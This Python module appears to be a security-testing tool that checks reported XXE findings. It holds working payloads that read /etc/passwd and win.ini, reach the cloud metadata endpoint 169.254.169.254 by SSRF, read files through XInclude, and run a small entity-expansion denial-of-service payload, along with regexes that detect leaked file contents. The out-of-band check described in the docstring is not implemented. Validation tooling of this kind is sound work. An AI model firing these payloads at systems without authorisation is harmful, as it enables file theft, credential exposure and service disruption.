"""
XXE validation script for XML External Entity injection testing.

Validates XXE vulnerabilities by:
1. Sending XML payloads with external entity references
2. Checking for file disclosure in responses
3. Monitoring for SSRF via response content or callbacks
4. Detecting blind XXE via out-of-band interactions
5. Classifying results (VALIDATED, FALSE_POSITIVE, PARTIAL, UNVALIDATED)

CWE Coverage: CWE-611, CWE-776, CWE-827, CWE-918
"""

import hashlib
import json
import re
from dataclasses import dataclass, field
from typing import Any, Optional
from urllib.parse import urljoin

# Type hints for requests (not imported to avoid dependency)
# In actual use, import requests


@dataclass
class XXETestResult:
    """Result of an XXE test."""

    status: str  # VALIDATED, FALSE_POSITIVE, PARTIAL, UNVALIDATED
    injection_type: str
    cwe: str
    attack_type: str
    payload_used: str
    evidence: str
    test_details: dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        return {
            "status": self.status,
            "injection_type": self.injection_type,
            "cwe": self.cwe,
            "attack_type": self.attack_type,
            "payload_used": self.payload_used,
            "evidence": self.evidence,
            "test": self.test_details,
        }


class XXEValidator:
    """Validates XXE vulnerabilities across different attack types."""

    # File content indicators for successful disclosure
    FILE_INDICATORS = {
        "linux": [
            (r"root:.*:0:0:", "/etc/passwd"),
            (r"localhost|127\.0\.0\.1", "/etc/hosts"),
            (r"Linux version", "/proc/version"),
        ],
        "windows": [
            (r"\[fonts\]|\[extensions\]", "win.ini"),
            (r"\[boot loader\]", "boot.ini"),
            (r"\[drivers\]", "system.ini"),
        ],
    }

    # Cloud metadata indicators
    METADATA_INDICATORS = [
        (r"ami-[a-z0-9]+", "AWS AMI ID"),
        (r"i-[a-z0-9]+", "AWS Instance ID"),
        (r"arn:aws:", "AWS ARN"),
        (r"projects/\d+/", "GCP Project"),
        (r"subscriptions/[a-z0-9-]+", "Azure Subscription"),
    ]

    # XXE blocked indicators
    BLOCKED_INDICATORS = [
        r"external entities",
        r"entity.*disabled",
        r"dtd.*not allowed",
        r"doctype.*blocked",
        r"xml.*injection",
    ]

    def __init__(
        self,
        base_url: str,
        timeout: int = 10,
        verify_ssl: bool = True,
        callback_url: Optional[str] = None,
    ):
        """
        Initialize XXE validator.

        Args:
            base_url: Base URL of target application
            timeout: Request timeout in seconds
            verify_ssl: Whether to verify SSL certificates
            callback_url: URL for OOB callback monitoring (for blind XXE)
        """
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.callback_url = callback_url
        self.session = None  # Set up requests session when needed

    def _make_request(
        self,
        method: str,
        endpoint: str,
        data: Optional[str] = None,
        headers: Optional[dict] = None,
        content_type: str = "application/xml",
    ) -> tuple[int, str, dict, float]:
        """
        Make HTTP request and return status, body, headers, response_time.
        Placeholder - implement with actual HTTP client.
        """
        # In actual implementation, use requests library
        # import requests
        # response = requests.request(method, url, data=data, headers=headers, ...)
        raise NotImplementedError("Implement with HTTP client library")

    def _hash_response(self, content: str) -> str:
        """Generate SHA256 hash of response content."""
        return f"sha256:{hashlib.sha256(content.encode()).hexdigest()[:16]}"

    def _truncate_snippet(self, content: str, max_len: int = 500) -> str:
        """Truncate response content for evidence."""
        if len(content) <= max_len:
            return content
        return content[:max_len] + "..."

    def _check_file_disclosure(
        self, response: str, os_type: str = "linux"
    ) -> Optional[tuple[str, str]]:
        """Check if response contains file disclosure indicators."""
        indicators = self.FILE_INDICATORS.get(os_type, [])
        for pattern, file_name in indicators:
            if re.search(pattern, response, re.IGNORECASE):
                return (pattern, file_name)
        return None

    def _check_metadata_disclosure(self, response: str) -> Optional[tuple[str, str]]:
        """Check if response contains cloud metadata indicators."""
        for pattern, desc in self.METADATA_INDICATORS:
            if re.search(pattern, response, re.IGNORECASE):
                return (pattern, desc)
        return None

    def _check_blocked(self, response: str) -> bool:
        """Check if XXE appears to be blocked."""
        response_lower = response.lower()
        for pattern in self.BLOCKED_INDICATORS:
            if re.search(pattern, response_lower):
                return True
        return False

    def validate_file_disclosure(
        self,
        endpoint: str,
        method: str = "POST",
        content_type: str = "application/xml",
        os_type: str = "linux",
    ) -> XXETestResult:
        """
        Validate file disclosure via XXE.

        Args:
            endpoint: Target endpoint path
            method: HTTP method
            content_type: Content-Type header
            os_type: Target OS (linux/windows)

        Returns:
            XXETestResult with validation status
        """
        url = urljoin(self.base_url, endpoint)

        # Select appropriate file based on OS
        if os_type == "linux":
            file_uri = "file:///etc/passwd"
        else:
            file_uri = "file:///c:/windows/win.ini"

        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{file_uri}">
]>
<root><data>&xxe;</data></root>"""

        try:
            status_code, response_body, _, response_time = self._make_request(
                method, endpoint, data=payload, content_type=content_type
            )
        except Exception as e:
            return XXETestResult(
                status="UNVALIDATED",
                injection_type="xxe_file_disclosure",
                cwe="CWE-611",
                attack_type="file_disclosure",
                payload_used=payload,
                evidence=f"Request failed: {str(e)}",
                test_details={"url": url, "error": str(e)},
            )

        # Check for WAF/blocking
        if status_code in (403, 406, 429) or self._check_blocked(response_body):
            return XXETestResult(
                status="UNVALIDATED",
                injection_type="xxe_file_disclosure",
                cwe="CWE-611",
                attack_type="file_disclosure",
                payload_used=payload,
                evidence=f"Blocked by WAF/security (HTTP {status_code})",
                test_details={"url": url, "status": status_code},
            )

        # Check for file disclosure
        disclosure = self._check_file_disclosure(response_body, os_type)
        if disclosure:
            pattern, file_name = disclosure
            return XXETestResult(
                status="VALIDATED",
                injection_type="xxe_file_disclosure",
                cwe="CWE-611",
                attack_type="file_disclosure",
                payload_used=payload,
                evidence=f"XXE file disclosure: {file_name} contents returned",
                test_details={
                    "url": url,
                    "method": method,
                    "status": status_code,
                    "file_read": file_uri,
                    "indicator_matched": pattern,
                    "response_snippet": self._truncate_snippet(response_body),
                    "response_hash": self._hash_response(response_body),
                },
            )

        return XXETestResult(
            status="FALSE_POSITIVE",
            injection_type="xxe_file_disclosure",
            cwe="CWE-611",
            attack_type="file_disclosure",
            payload_used=payload,
            evidence="No file disclosure indicators detected",
            test_details={
                "url": url,
                "status": status_code,
                "response_snippet": self._truncate_snippet(response_body),
            },
        )

    def validate_ssrf(
        self,
        endpoint: str,
        target_url: str = "http://169.254.169.254/latest/meta-data/",
        method: str = "POST",
        content_type: str = "application/xml",
    ) -> XXETestResult:
        """
        Validate SSRF via XXE.

        Args:
            endpoint: Target endpoint path
            target_url: Internal URL to access via SSRF
            method: HTTP method
            content_type: Content-Type header

        Returns:
            XXETestResult with validation status
        """
        url = urljoin(self.base_url, endpoint)

        payload = f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{target_url}">
]>
<foo>&xxe;</foo>"""

        try:
            status_code, response_body, _, response_time = self._make_request(
                method, endpoint, data=payload, content_type=content_type
            )
        except Exception as e:
            return XXETestResult(
                status="UNVALIDATED",
                injection_type="xxe_ssrf",
                cwe="CWE-611",
                attack_type="ssrf",
                payload_used=payload,
                evidence=f"Request failed: {str(e)}",
                test_details={"url": url, "error": str(e)},
            )

        # Check for metadata disclosure
        metadata = self._check_metadata_disclosure(response_body)
        if metadata:
            pattern, desc = metadata
            return XXETestResult(
                status="VALIDATED",
                injection_type="xxe_ssrf",
                cwe="CWE-611",
                attack_type="ssrf",
                payload_used=payload,
                evidence=f"SSRF via XXE: {desc} disclosed",
                test_details={
                    "url": url,
                    "target_url": target_url,
                    "status": status_code,
                    "indicator_matched": pattern,
                    "response_snippet": self._truncate_snippet(response_body),
                    "response_hash": self._hash_response(response_body),
                },
            )

        # Check for any non-error response that might indicate SSRF success
        if status_code == 200 and len(response_body) > 100:
            return XXETestResult(
                status="PARTIAL",
                injection_type="xxe_ssrf",
                cwe="CWE-611",
                attack_type="ssrf",
                payload_used=payload,
                evidence="Possible SSRF - response returned but no clear indicators",
                test_details={
                    "url": url,
                    "target_url": target_url,
                    "status": status_code,
                    "response_length": len(response_body),
                    "requires_manual_review": True,
                },
            )

        return XXETestResult(
            status="FALSE_POSITIVE",
            injection_type="xxe_ssrf",
            cwe="CWE-611",
            attack_type="ssrf",
            payload_used=payload,
            evidence="No SSRF indicators detected",
            test_details={"url": url, "status": status_code},
        )

    def validate_xinclude(
        self,
        endpoint: str,
        method: str = "POST",
        content_type: str = "application/xml",
    ) -> XXETestResult:
        """
        Validate XInclude XXE (when DOCTYPE is blocked).

        Args:
            endpoint: Target endpoint path
            method: HTTP method
            content_type: Content-Type header

        Returns:
            XXETestResult with validation status
        """
        url = urljoin(self.base_url, endpoint)

        payload = """<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>"""

        try:
            status_code, response_body, _, response_time = self._make_request(
                method, endpoint, data=payload, content_type=content_type
            )
        except Exception as e:
            return XXETestResult(
                status="UNVALIDATED",
                injection_type="xxe_xinclude",
                cwe="CWE-611",
                attack_type="xinclude",
                payload_used=payload,
                evidence=f"Request failed: {str(e)}",
                test_details={"url": url, "error": str(e)},
            )

        disclosure = self._check_file_disclosure(response_body, "linux")
        if disclosure:
            pattern, file_name = disclosure
            return XXETestResult(
                status="VALIDATED",
                injection_type="xxe_xinclude",
                cwe="CWE-611",
                attack_type="xinclude",
                payload_used=payload,
                evidence=f"XInclude XXE: {file_name} disclosed (DOCTYPE may be blocked)",
                test_details={
                    "url": url,
                    "status": status_code,
                    "response_snippet": self._truncate_snippet(response_body),
                    "response_hash": self._hash_response(response_body),
                },
            )

        return XXETestResult(
            status="FALSE_POSITIVE",
            injection_type="xxe_xinclude",
            cwe="CWE-611",
            attack_type="xinclude",
            payload_used=payload,
            evidence="XInclude processing disabled or no disclosure",
            test_details={"url": url, "status": status_code},
        )

    def validate_dos(
        self,
        endpoint: str,
        method: str = "POST",
        content_type: str = "application/xml",
        baseline_time: Optional[float] = None,
    ) -> XXETestResult:
        """
        Validate DoS via entity expansion (minimal payload).

        WARNING: Uses minimal payload. Abort if server impact detected.

        Args:
            endpoint: Target endpoint path
            method: HTTP method
            content_type: Content-Type header
            baseline_time: Baseline response time in seconds

        Returns:
            XXETestResult with validation status
        """
        url = urljoin(self.base_url, endpoint)

        # MINIMAL payload - only 3 levels
        payload = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>"""

        # Get baseline if not provided
        if baseline_time is None:
            try:
                _, _, _, baseline_time = self._make_request(
                    method, endpoint, data="<foo>test</foo>", content_type=content_type
                )
            except Exception:
                baseline_time = 0.5

        try:
            status_code, response_body, _, response_time = self._make_request(
                method, endpoint, data=payload, content_type=content_type
            )
        except Exception as e:
            return XXETestResult(
                status="UNVALIDATED",
                injection_type="xxe_dos",
                cwe="CWE-776",
                attack_type="dos_entity_expansion",
                payload_used="[MINIMAL billion laughs payload]",
                evidence=f"Request failed: {str(e)}",
                test_details={"url": url, "error": str(e)},
            )

        time_increase = response_time / baseline_time if baseline_time > 0 else 0

        if time_increase >= 5:  # 5x slowdown indicates vulnerability
            return XXETestResult(
                status="VALIDATED",
                injection_type="xxe_dos",
                cwe="CWE-776",
                attack_type="dos_entity_expansion",
                payload_used="[MINIMAL billion laughs payload - 3 levels]",
                evidence=f"DoS via entity expansion: {time_increase:.1f}x response time increase",
                test_details={
                    "url": url,
                    "status": status_code,
                    "baseline_time_ms": int(baseline_time * 1000),
                    "payload_time_ms": int(response_time * 1000),
                    "time_increase_factor": round(time_increase, 2),
                },
            )

        return XXETestResult(
            status="FALSE_POSITIVE",
            injection_type="xxe_dos",
            cwe="CWE-776",
            attack_type="dos_entity_expansion",
            payload_used="[MINIMAL billion laughs payload]",
            evidence="Entity expansion limited or disabled",
            test_details={
                "url": url,
                "status": status_code,
                "response_time_ms": int(response_time * 1000),
            },
        )


def validate_from_vulnerabilities(
    vulns_file: str, base_url: str, callback_url: Optional[str] = None
) -> list[dict[str, Any]]:
    """
    Validate XXE findings from VULNERABILITIES.json.

    Args:
        vulns_file: Path to VULNERABILITIES.json
        base_url: Base URL of target
        callback_url: URL for OOB callback monitoring

    Returns:
        List of validation results
    """
    with open(vulns_file) as f:
        vulns = json.load(f)

    validator = XXEValidator(base_url, callback_url=callback_url)
    results = []

    for vuln in vulns:
        if vuln.get("cwe") not in ["CWE-611", "CWE-776", "CWE-827"]:
            continue

        endpoint = vuln.get("endpoint", "/api/xml")

        # Run appropriate test based on attack type hint
        attack_type = vuln.get("attack_type", "file_disclosure")

        if attack_type == "ssrf":
            result = validator.validate_ssrf(endpoint)
        elif attack_type == "xinclude":
            result = validator.validate_xinclude(endpoint)
        elif attack_type == "dos":
            result = validator.validate_dos(endpoint)
        else:
            result = validator.validate_file_disclosure(endpoint)

        results.append(result.to_dict())

    return results


if __name__ == "__main__":
    print("XXE Validator - Example Usage")
    print("=" * 40)
    print(
        """
from validate_xxe import XXEValidator

validator = XXEValidator("http://target.com")

# Test file disclosure
result = validator.validate_file_disclosure(
    endpoint="/api/parse",
    os_type="linux"
)
print(result.to_dict())

# Test SSRF via XXE
result = validator.validate_ssrf(
    endpoint="/api/xml",
    target_url="http://169.254.169.254/latest/meta-data/"
)
print(result.to_dict())

# Test XInclude (when DOCTYPE blocked)
result = validator.validate_xinclude(
    endpoint="/api/parse"
)
print(result.to_dict())

# Test DoS (minimal payload)
result = validator.validate_dos(
    endpoint="/api/parse"
)
print(result.to_dict())
    """
    )
